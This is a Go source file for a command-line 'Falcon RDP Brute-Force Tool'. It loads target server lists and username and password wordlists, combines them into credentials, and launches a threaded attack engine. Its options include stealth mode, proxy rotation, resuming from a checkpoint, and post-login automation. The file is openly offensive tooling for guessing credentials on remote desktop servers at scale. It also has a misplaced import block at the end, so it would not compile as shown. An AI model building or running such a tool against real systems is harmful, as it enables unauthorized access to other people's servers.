package main

import (
	"flag"
	"fmt"
	"os"
)

func init() {
	// Print banner on startup
	fmt.Println(Banner)
}

func main() {
	// Command line flags
	var (
		uiMode        = flag.Bool("ui", false, "Start with GUI interface")
		interactive   = flag.Bool("interactive", false, "Start in interactive CLI mode")
		serversFile   = flag.String("servers", "servers.txt", "Path to servers.txt")
		usersFile     = flag.String("users", "users.txt", "Path to users.txt")
		passwordsFile = flag.String("passwords", "passwords.txt", "Path to passwords.txt")
		threads       = flag.Int("threads", 0, "Number of threads (0 for auto)")
		timeout       = flag.Int("timeout", 10, "Timeout in seconds")
		stealth       = flag.Bool("stealth", false, "Enable stealth mode")
		proxy         = flag.Bool("proxy", false, "Enable proxy")
		proxyFile     = flag.String("proxy-file", "proxies.txt", "Path to proxy file")
		resume        = flag.Bool("resume", false, "Resume from checkpoint")
		postLogin     = flag.Bool("postlogin", false, "Enable post-login automation")
		generate      = flag.Bool("generate", false, "Generate credentials from files")
		version       = flag.Bool("version", false, "Show version")
		help          = flag.Bool("help", false, "Show help")
	)

	flag.Parse()

	// Initialize logger
	_ = logger.Init("falcon.log")
	defer logger.Close()

	if *version {
		fmt.Printf("Falcon RDP Brute-Force Tool v%s\n", Version)
		return
	}

	if *help {
		flag.PrintDefaults()
		return
	}

	// Load configuration
	cfg, err := config.LoadConfig()
	if err != nil {
		logger.Error("Failed to load config: %v", err)
		os.Exit(1)
	}

	// Override config with flags
	if *threads > 0 {
		cfg.Attack.Threads = *threads
	}
	if *stealth {
		cfg.Attack.StealthMode = true
	}
	if *proxy {
		cfg.Attack.ProxyEnabled = true
		cfg.Attack.ProxyFile = *proxyFile
	}
	if *resume {
		cfg.Attack.ResumeEnabled = true
	}
	if *postLogin {
		cfg.Attack.PostLoginEnabled = true
	}

	// Generate credentials if requested
	if *generate {
		generateCredentialsCommand(*usersFile, *passwordsFile)
		return
	}

	// Start interactive mode if requested
	if *interactive {
		InteractiveMode()
		return
	}

	// Start UI if requested
	if *uiMode {
		logger.Info("Starting UI mode...")
		logger.Warning("UI mode not yet implemented")
		return
	}

	// CLI mode
	startCLI(cfg, *serversFile, *usersFile, *passwordsFile)
}

func generateCredentialsCommand(usersFile, passwordsFile string) {
	logger.Info("Generating credentials...")

	users, err := credentials.LoadUsers(usersFile)
	if err != nil {
		logger.Error("Failed to load users: %v", err)
		return
	}

	passwords, err := credentials.LoadPasswords(passwordsFile)
	if err != nil {
		logger.Error("Failed to load passwords: %v", err)
		return
	}

	creds := credentials.GenerateCredentials(users, passwords, "")
	err = credentials.SaveCredentials(creds, "credentials.txt")
	if err != nil {
		logger.Error("Failed to save credentials: %v", err)
		return
	}

	logger.Success("Generated %d credentials", len(creds))
}

func startCLI(cfg *config.Config, serversFile, usersFile, passwordsFile string) {
	logger.Info("Starting Falcon in CLI mode")

	// Load targets
	targets, err := credentials.LoadServers(serversFile)
	if err != nil {
		logger.Error("Failed to load servers: %v", err)
		return
	}

	if len(targets) == 0 {
		logger.Error("No targets loaded from %s", serversFile)
		return
	}

	logger.Success("Loaded %d targets", len(targets))

	// Load credentials
	users, err := credentials.LoadUsers(usersFile)
	if err != nil {
		logger.Error("Failed to load users: %v", err)
		return
	}

	passwords, err := credentials.LoadPasswords(passwordsFile)
	if err != nil {
		logger.Error("Failed to load passwords: %v", err)
		return
	}

	creds := credentials.GenerateCredentials(users, passwords, cfg.Attack.DefaultDomain)
	logger.Success("Loaded %d credentials", len(creds))

	// Create attack engine
	engine := attack.NewAttackEngine(cfg, targets, creds)

	// Start attack
	err = engine.Start()
	if err != nil {
		logger.Error("Failed to start attack: %v", err)
		return
	}

	// Wait for completion or interrupt
	select {}
}

import (
	"falcon/attack"
	"falcon/config"
	"falcon/credentials"
	"falcon/logger"
)
